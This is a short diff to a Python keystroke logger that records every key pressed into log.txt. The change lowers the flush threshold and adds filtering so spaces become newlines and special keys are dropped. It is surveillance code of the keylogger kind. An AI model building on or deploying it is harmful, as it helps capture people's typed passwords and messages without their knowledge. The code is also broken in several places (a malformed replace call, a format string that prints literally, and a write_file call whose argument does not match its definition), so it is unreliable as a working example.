@@ -13,7 +13,7 @@ def on_press(key):
     count += 1
     print("(0) pressed".format(key))
 
-    if count >= 110:
+    if count >= 50:
         count = 0
         write_file(keys)
         keys = []
@@ -21,7 +21,12 @@ def on_press(key):
 def write_file():
     with open("log.txt", "a") as f: 
         for key in keys:
-            f.write(key)
+            k = str(key).replace("'"."")
+            if k.find("space") > 0: 
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
 
 def on_release(key):
     if key == Key.esc:
